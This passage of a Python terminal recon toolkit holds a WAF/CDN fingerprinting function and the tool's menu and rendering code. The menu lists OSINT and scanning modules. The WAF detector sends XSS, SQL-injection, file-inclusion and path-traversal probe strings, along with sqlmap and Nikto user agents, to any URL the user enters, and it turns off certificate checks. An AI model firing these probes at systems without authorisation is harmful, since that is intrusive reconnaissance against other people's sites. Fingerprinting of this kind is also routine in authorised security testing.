        log("BSSID",    net["bssid"])
        log("Signal",   signal_bar(net["signal"]))
        log("Channel",  channel_band(net["channel"]))
        log("Frequency",net["freq"])
        log("Rate",     net["rate"])
        log("Mode",     net["mode"])
        log("Security", security_label(net["security"]))
        print()

    elapsed = datetime.now() - start_time
    print(f"\n{v}{'─'*65}")
    print(f"  Wifi Scan Report By AltWolf  -  {elapsed.seconds}s elapsed")
    print(f"{'─'*65}{r0}\n")

    open_nets = [n for n in networks if "OPEN" in n["security"].upper()]
    wep_nets  = [n for n in networks if "WEP"  in n["security"].upper()]
    wpa3_nets = [n for n in networks if "WPA3" in n["security"].upper()]

    print(f"  Total networks : {len(networks)}")
    print(f"  {b0}Open (no encryption){r0} : {len(open_nets)}")
    print(f"  {b0}WEP (weak){r0}           : {len(wep_nets)}")
    print(f"  {b0}WPA3 (strong){r0}        : {len(wpa3_nets)}")

    if open_nets:
        print(f"\n  {v}Open networks detected :{r0}")
        for n in open_nets:
            print(f"    - {n['ssid']} ({n['bssid']})")

    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

def run_18_firewall_detect():
    show_cur(); sys.stdout.write(clrscr())
    v = rgb(*VIOLET_MID); r0 = reset(); w = rgb(255,255,255); b0 = bold()
    sys.stdout.write(clrscr())
    sys.stdout.flush()

    banner = (
        f"\n{v}"
        "    ██╗    ██╗ █████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗\n"
        "    ██║    ██║██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
        "    ██║ █╗ ██║███████║█████╗      ███████╗██║     ███████║██╔██╗ ██║\n"
        "    ██║███╗██║██╔══██║██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║\n"
        "    ╚███╔███╔╝██║  ██║██║         ███████║╚██████╗██║  ██║██║ ╚████║\n"
        "     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
        f"              {b0}WAF Detector By AltWolf{r0}{v}\n"
        f"{r0}\n"
    )
    print(banner)
    sys.stdout.flush()

    requests.packages.urllib3.disable_warnings()

    session = requests.Session()
    session.verify = False
    session.stream = False

    target = input("Target URL: ").strip()
    if not target.startswith("http"):
        target = "https://" + target

    hostname  = urlparse(target).hostname
    start_time = datetime.now()
    findings  = []
    detected  = {}

    def out(text=""):
        sys.stdout.write(text + "\n")
        sys.stdout.flush()

    def log(category, label, detail=""):
        line = f"{v}[{category}]{r0} {label}"
        if detail:
            line += f" | {detail}"
        out(line)
        findings.append({"category": category, "label": label, "detail": detail})

    def flag(waf, reason):
        if waf not in detected:
            detected[waf] = []
        if reason not in detected[waf]:
            detected[waf].append(reason)

    def safe_get(url, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)", timeout=12):
        try:
            resp = session.get(
                url, timeout=timeout, allow_redirects=True,
                headers={"User-Agent": ua},
                stream=False
            )
            _ = resp.content
            return resp
        except Exception:
            return None

    out(f"\n{v}[*] Target  : {target}")
    out(f"[*] Host    : {hostname}")
    out(f"[*] Started : {start_time.strftime('%Y-%m-%d %H:%M:%S')}{r0}\n")

    out(f"{b0}[*] DNS analysis...{r0}")
    try:
        ip = socket.gethostbyname(hostname)
        log("IP", ip)

        cf_ranges  = [
            "103.21.","103.22.","103.31.","104.16.","104.17.","104.18.","104.19.",
            "104.20.","104.21.","104.22.","108.162.","131.0.","141.101.","162.158.",
            "172.64.","172.65.","172.66.","172.67.","172.68.","172.69.","172.70.",
            "172.71.","188.114.","190.93.","197.234.","198.41.","199.27.",
        ]
        ak_ranges  = ["23.32.","23.64.","23.72.","23.192.","104.64.","104.65."]
        ft_ranges  = ["151.101.","199.232.","23.235."]
        aws_ranges = ["13.","52.","54.","99.","176.32.","205.251."]

        ip_matched = False
        for prefix, waf_name, label in [
            (cf_ranges,  "Cloudflare",     "CF IP range"),
            (ak_ranges,  "Akamai",         "Akamai IP range"),
            (ft_ranges,  "Fastly",         "Fastly IP range"),
            (aws_ranges, "AWS CloudFront", "AWS IP range"),
        ]:
            for r in prefix:
                if ip.startswith(r):
                    log("DNS", label, ip)
                    flag(waf_name, f"IP in {label}: {ip}")
                    ip_matched = True
                    break
            if ip_matched:
                break

        if not ip_matched:
            log("DNS", "IP not in known CDN/WAF ranges", ip)

        try:
            rdns = socket.gethostbyaddr(ip)[0].lower()
            log("Reverse DNS", rdns)
            for kw, waf in [("cloudflare","Cloudflare"),("akamai","Akamai"),
                             ("fastly","Fastly"),("amazon","AWS"),
                             ("sucuri","Sucuri"),("incapsula","Imperva")]:
                if kw in rdns:
                    flag(waf, f"rDNS: {rdns}")
        except Exception:
            log("Reverse DNS", "Not available")

    except Exception as e:
        log("DNS", "Failed", str(e))

    out(f"\n{b0}[*] SSL certificate...{r0}")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
            s.settimeout(10)
            s.connect((hostname, 443))
            cert = s.getpeercert()

        issuer  = dict(x[0] for x in cert.get("issuer",  []))
        subject = dict(x[0] for x in cert.get("subject", []))
        san     = [val for _, val in cert.get("subjectAltName", [])]
        org     = issuer.get("organizationName", "")
        cn      = subject.get("commonName", "")

        log("SSL Issuer",  org)
        log("SSL Subject", cn)
        for entry in san[:8]:
            log("SSL SAN", entry)

        for kw, waf in [("cloudflare","Cloudflare"),("akamai","Akamai"),
                        ("amazon","AWS CloudFront"),("sucuri","Sucuri"),
                        ("imperva","Imperva"),("fastly","Fastly"),
                        ("incapsula","Imperva")]:
            if kw in org.lower() or kw in cn.lower():
                flag(waf, f"SSL cert org: {org}")

        not_after = cert.get("notAfter", "")
        if not_after:
            exp  = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
            days = (exp - datetime.now()).days
            log("SSL Expiry", f"{days} days remaining")

    except Exception as e:
        log("SSL", "Failed", str(e))

    out(f"\n{b0}[*] HTTP headers...{r0}")
    r = safe_get(target)
    if r is not None:
        h            = dict(r.headers)
        hl           = {k.lower(): v for k, v in h.items()}
        body         = r.text.lower()
        cookies_list = [c.lower() for c in r.cookies.keys()]

        skip = {"nel","report-to","set-cookie","content-security-policy"}
        for k, v in h.items():
            if k.lower() not in skip:
                log("Header", k, str(v)[:120])

        csp = hl.get("content-security-policy", "")
        if csp:
            log("CSP", "Present", f"{len(csp)} chars")
            for kw, waf in [("arkoselabs","Arkose Labs"),("funcaptcha","Arkose Labs"),
                             ("cloudflare","Cloudflare"),("fastly","Fastly"),
                             ("akamai","Akamai"),("perimeterx","PerimeterX"),
                             ("datadome","DataDome"),("imperva","Imperva"),
                             ("cloudfront","AWS CloudFront")]:
                if kw in csp.lower():
                    flag(waf, f"CSP reference: {kw}")

        if "nel" in hl:
            log("NEL", "Network Error Logging present")
        if "report-to" in hl:
            log("Report-To", "Present")

        server_val = hl.get("server", "").lower()
        if server_val:
            log("Server", server_val)
            if server_val in ("website", "nginx", "apache", ""):
                log("Server", "Header is generic or hidden - WAF may be stripping it")
            for sig, waf in [("cloudflare","Cloudflare"),("cloudflare-nginx","Cloudflare"),
                              ("awselb","AWS ELB"),("akamaighost","Akamai"),
                              ("sucuri","Sucuri"),("fortigate","Fortinet"),
                              ("fortiweb","Fortinet"),("big-ip","F5 BIG-IP"),
                              ("barracuda","Barracuda"),("reblaze","Reblaze"),
                              ("mod_security","ModSecurity")]:
                if sig in server_val:
                    flag(waf, f"Server header: {server_val}")

        powered = hl.get("x-powered-by", "")
        if powered:
            log("X-Powered-By", powered[:80])

        for hname, (waf, reason) in {
            "cf-ray":               ("Cloudflare",        "CF-Ray"),
            "cf-cache-status":      ("Cloudflare",        "CF-Cache-Status"),
            "cf-request-id":        ("Cloudflare",        "CF-Request-ID"),
            "x-iinfo":              ("Imperva/Incapsula", "X-Iinfo"),
            "x-cdn":                ("Imperva/Incapsula", "X-CDN"),
            "x-sucuri-id":          ("Sucuri",            "X-Sucuri-ID"),
            "x-sucuri-cache":       ("Sucuri",            "X-Sucuri-Cache"),
            "x-amz-cf-id":          ("AWS CloudFront",    "X-Amz-Cf-Id"),
            "x-amz-cf-pop":         ("AWS CloudFront",    "X-Amz-Cf-Pop"),
            "x-served-by":          ("Fastly",            "X-Served-By"),
            "x-varnish":            ("Varnish",           "X-Varnish"),
            "x-wallarm-node":       ("Wallarm",           "X-Wallarm-Node"),
            "x-sl-compstate":       ("Radware",           "X-SL-CompState"),
            "x-msedge-ref":         ("Azure CDN",         "X-MSEdge-Ref"),
            "x-fw-hash":            ("Fortinet",          "X-FW-Hash"),
            "x-datadome":           ("DataDome",          "X-DataDome"),
            "x-reblaze-protection": ("Reblaze",           "X-Reblaze"),
        }.items():
            if hname in hl:
                flag(waf, f"{reason}: {hl[hname][:60]}")

        for cookie_name, waf in [("__cfduid","Cloudflare"),("cf_clearance","Cloudflare"),
                                  ("__cf_bm","Cloudflare"),("ak_bmsc","Akamai"),
                                  ("bm_sz","Akamai"),("aws-waf-token","AWS WAF"),
                                  ("incap_ses","Imperva"),("visid_incap","Imperva"),
                                  ("rbzid","Reblaze"),("datadome","DataDome")]:
            for c in cookies_list:
                if cookie_name in c:
                    flag(waf, f"Cookie: {c}")

        for pattern, waf in [("cloudflare","Cloudflare"),("__cf_email__","Cloudflare"),
                              ("incapsula","Imperva"),("sucuri","Sucuri"),
                              ("wordfence","Wordfence"),("modsecurity","ModSecurity"),
                              ("perimeterx","PerimeterX"),("px-captcha","PerimeterX"),
                              ("datadome","DataDome"),("kasada","Kasada"),
                              ("arkoselabs","Arkose Labs"),("funcaptcha","Arkose Labs"),
                              ("recaptcha","reCAPTCHA"),("hcaptcha","hCaptcha"),
                              ("turnstile","Cloudflare Turnstile")]:
            if pattern in body:
                flag(waf, f"Body: {pattern}")

        custom_headers = {k: hl[k] for k in hl
                          if k.startswith("x-roblox") or k.startswith("roblox-")
                          or k.startswith("x-amzn") or k.startswith("x-azure")}
        if custom_headers:
            for ch, val in custom_headers.items():
                log("Custom Header", ch, val[:80])
            flag("Custom / In-house WAF", f"Proprietary headers: {', '.join(custom_headers.keys())}")

    out(f"\n{b0}[*] Behavior probes...{r0}")

    probe_list = [
        ("Clean",          target,                                       "Mozilla/5.0 (Windows NT 10.0)"),
        ("XSS",            target + "/?q=<script>alert(1)</script>",     "Mozilla/5.0 (Windows NT 10.0)"),
        ("SQLi",           target + "/?id=1'+OR+'1'='1",                 "Mozilla/5.0 (Windows NT 10.0)"),
        ("LFI",            target + "/?f=../../../../etc/passwd",         "Mozilla/5.0 (Windows NT 10.0)"),
        ("Scanner UA",     target,                                        "sqlmap/1.4"),
        ("Nikto UA",       target,                                        "Nikto/2.1.6"),
        ("Curl UA",        target,                                        "curl/7.68"),
        ("Empty UA",       target,                                        ""),
        ("Path traversal", target + "/%2e%2e%2fetc%2fpasswd",            "Mozilla/5.0"),
    ]

    clean_status = None
    clean_size   = None

    for label, url, ua in probe_list:
        resp = safe_get(url, ua=ua, timeout=10)
        if resp is None:
            log("Probe", label, "timeout or connection error")
            continue

        status = resp.status_code
        size   = len(resp.content)

        if label == "Clean":
            clean_status = status
            clean_size   = size

        diff = abs(size - clean_size) if clean_size else 0
        log("Probe", label, f"status={status}  size={size}  diff={diff}")

        if status in (403, 406, 429, 503) and label != "Clean":
            flag("WAF Active", f"Blocked [{label}] with HTTP {status}")

        if label != "Clean" and clean_size and diff > 800 and status != clean_status:
            flag("WAF Behavior", f"Distinct response on [{label}] diff={diff}b status={status}")

    out(f"\n{b0}[*] Traceroute...{r0}")
    try:
        cmd = ["tracert", "-h", "10", hostname] if platform.system() == "Windows" \
              else ["traceroute", "-m", "10", "-w", "2", hostname]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
        for hop in result.stdout.strip().splitlines():
            hop_l = hop.lower()
            out(f"{v}[Hop]{r0} {hop.strip()[:100]}")
            for kw, waf in [("cloudflare","Cloudflare"),("akamai","Akamai"),
                             ("fastly","Fastly"),("sucuri","Sucuri"),
                             ("incapsula","Imperva")]:
                if kw in hop_l:
                    flag(waf, f"Traceroute hop: {hop.strip()[:60]}")
    except Exception:
        log("Traceroute", "Not available or timed out")

    elapsed = datetime.now() - start_time

    out(f"\n{v}{'─'*65}")
    out(f"  WAF Detection Report By AltWolf  -  {elapsed.seconds}s elapsed")
    out(f"{'─'*65}{r0}\n")

    if detected:
        out(f"  {b0}Detected WAF / Firewall / CDN :{r0}\n")
        for waf_name, reasons in detected.items():
            out(f"  {v}[+]{r0} {b0}{waf_name}{r0}")
            for reason in reasons:
                out(f"        - {reason}")
        out()
    else:
        out(f"  {v}[?]{r0} No WAF detected - custom rules or unprotected\n")

    out(f"  Total signals : {len(findings)}")
    out(f"  Layers found  : {len(detected)}")





    input(f'\n  {v}Press Enter to go back...{r0} ')
    hide_cur()

ACTION_MAP = {
    '01': run_01_ip_info,
    '02': run_02_port_scanner,
    '03': run_03_ping_sweep,
    '04': run_04_traceroute,
    '05': run_05_dns_lookup,
    '06': run_06_whois,
    '07': run_07_username_search,
    '08': run_08_phone_lookup,
    '09': run_09_email_tracker,
    '10': run_10_image_search,
    '11': run_11_domain_history,
    '12': run_12_google_dork,
    '13': run_13_xss_search,
    '14': run_14_sql_search,
    '15': run_15_vuln_scanner,
    '16': run_16_web_scanner,
    '17': run_17_wifi_scanner,
    '18': run_18_firewall_detect,
}

def kbhit_unix(t=0):
    return select.select([sys.stdin], [], [], t)[0] != []

def getch_unix():
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
        if ch == '\x1b':
            if kbhit_unix(0.05): ch += sys.stdin.read(1)
            if kbhit_unix(0.05): ch += sys.stdin.read(1)
        return ch
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

def get_key():
    if WINDOWS:
        if not msvcrt.kbhit(): return None
        k = msvcrt.getch()
        if k in (b'\x00', b'\xe0'):
            k2 = msvcrt.getch()
            return {b'H':'UP', b'P':'DOWN', b'K':'LEFT', b'M':'RIGHT'}.get(k2)
        c = k.decode('utf-8', 'ignore').lower()
        if c == '\r':   return 'ENTER'
        if c == '\x03': raise KeyboardInterrupt
        return {'w':'UP','s':'DOWN','a':'LEFT','d':'RIGHT'}.get(c)
    else:
        if not kbhit_unix(): return None
        k = getch_unix()
        if k == '\x1b[A': return 'UP'
        if k == '\x1b[B': return 'DOWN'
        if k == '\x1b[C': return 'RIGHT'
        if k == '\x1b[D': return 'LEFT'
        if k in ('\r', '\n'): return 'ENTER'
        if k == '\x03':   raise KeyboardInterrupt
        return {'w':'UP','s':'DOWN','a':'LEFT','d':'RIGHT'}.get(k.lower())

def make_col_lines(title, items, sel_row, ac, hi_ac, is_sel):
    W  = COL_W
    a  = rgb(*ac)
    h  = rgb(*hi_ac)
    w  = rgb(255, 255, 255)
    lv = rgb(200, 160, 255)
    r0 = reset()
    b0 = bold()
    lines = []
    title_part   = f'  {title}  '
    dashes_total = W - len(title_part)
    dl = dashes_total // 2
    dr = dashes_total - dl
    lines.append(f'{a}╔{"═"*dl}{title_part}{"═"*dr}╗{r0}')
    for ri in range(N_ROWS):
        num, label = items[ri]
        selected   = is_sel and (ri == sel_row)
        if selected:
            content_vis = f'({num}) \u25b6 {label}'
            pad = W - len(content_vis)
            line = (
                f'{h}║{r0}'
                f'{h}{b0}({r0}{w}{b0}{num}{r0}{h}{b0}){r0}'
                f' {h}{b0}\u25b6 {label}{r0}'
                f'{" " * max(0, pad)}'
                f'{h}║{r0}'
            )
        else:
            content_vis = f'({num}) {label}'
            pad = W - len(content_vis)
            line = (
                f'{a}║{r0}'
                f'{a}({r0}{lv}{num}{r0}{a}){r0}'
                f' {w}{label}{r0}'
                f'{" " * max(0, pad)}'
                f'{a}║{r0}'
            )
        lines.append(line)
    lines.append(f'{a}╚{"═"*W}╝{r0}')
    return lines

def render(sel_col, sel_row, tick):
    import shutil
    term_w = shutil.get_terminal_size((120, 40)).columns
    ac    = violet(tick)
    t_hi  = (math.sin(tick * 0.06 + 1.0) + 1) / 2
    hi_ac = blend(VIOLET_MID, VIOLET_LIGHT, 0.3 + 0.7 * t_hi)
    out = ['\033[H']
    min_lead    = min(len(l) - len(l.lstrip()) for l in BANNER if l.strip())
    max_content = max(len(l[min_lead:].rstrip()) for l in BANNER)
    bpad        = max(0, (term_w - max_content) // 2)
    for line in BANNER:
        out.append(f'{rgb(*ac)}{" " * bpad}{line[min_lead:]}\033[K\n')
    out.append('\033[K\n')
    intro = [
        '   < [More tools:]',
        '   < [ https://beacons.ai/alttool ]            < [Creator] Team AltSad            < [V] By AltWolf V3',
    ]
    for line in intro:
        out.append(f'{rgb(*ac)}{line}\033[K\n')
    out.append('\033[K\n')
    all_cols = [
        make_col_lines(title, items, sel_row, ac, hi_ac, ci == sel_col)
        for ci, (title, items) in enumerate(COLS_DATA)
    ]
    n_cols  = len(all_cols)
    total_w = n_cols * (COL_W + 2) + (n_cols - 1) * COL_GAP
    margin  = max(0, (term_w - total_w) // 2)
    pad     = ' ' * margin
    gap     = ' ' * COL_GAP
    for li in range(len(all_cols[0])):
        row = gap.join(col[li] for col in all_cols)
        out.append(f'{pad}{row}\033[K\n')
    out.append('\033[K\n')
    num, label = COLS_DATA[sel_col][1][sel_row]
    out.append(
        f'{pad}{rgb(*ac)}[↑↓] navigate   [←→] switch column   [Enter] select'
        f'   |   ({num}) {label}{reset()}\033[K\n'
    )
    out.append('\033[K\n')
    sys.stdout.write(''.join(out))
    sys.stdout.flush()

def print_gradient(text, delay=0.0003):
    n = max(len(text)-1, 1)
    for i, ch in enumerate(text):
        c = blend(VIOLET_MID, VIOLET_LIGHT, i/n)
        sys.stdout.write(f'\033[38;2;{c[0]};{c[1]};{c[2]}m{ch}')
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(reset() + '\n')

def main():
    import shutil
    tw, th = shutil.get_terminal_size((120, 40))
    hide_cur()
    try:
        matrix_intro(tw, th, duration=3.5)
        sys.stdout.write(clrscr()); sys.stdout.flush()
        tw2         = shutil.get_terminal_size((120, 40)).columns
        min_lead    = min(len(l) - len(l.lstrip()) for l in BANNER if l.strip())
        max_content = max(len(l[min_lead:].rstrip()) for l in BANNER)
        bpad        = max(0, (tw2 - max_content) // 2)
        for line in BANNER:
            print_gradient(' ' * bpad + line[min_lead:])
        time.sleep(0.4)
        sel_col, sel_row = 0, 0
        n_cols = len(COLS_DATA)
        tick   = 0
        sys.stdout.write(clrscr()); sys.stdout.flush()
        while True:
            render(sel_col, sel_row, tick)
            tick = (tick + 1) % 1_000_000
            key = get_key()
            if key == 'UP':
                sel_row = (sel_row - 1) % N_ROWS
            elif key == 'DOWN':
                sel_row = (sel_row + 1) % N_ROWS
            elif key == 'LEFT':
                sel_col = (sel_col - 1) % n_cols
            elif key == 'RIGHT':
                sel_col = (sel_col + 1) % n_cols
            elif key == 'ENTER':
                num, label = COLS_DATA[sel_col][1][sel_row]
                action = ACTION_MAP.get(num)
                if action:
                    sys.stdout.write(clrscr()); sys.stdout.flush()
                    try:
                        action()
                    except Exception as e:
                        show_cur()
                        print(f'\n  Error: {e}')
                        input('  Press Enter to go back...')
                        hide_cur()
                sys.stdout.write(clrscr()); sys.stdout.flush()
            time.sleep(0.04)
    except KeyboardInterrupt:
        pass
    finally:
        show_cur()
        sys.stdout.write(reset() + '\n')
        sys.stdout.flush()

if __name__ == '__main__':
    main()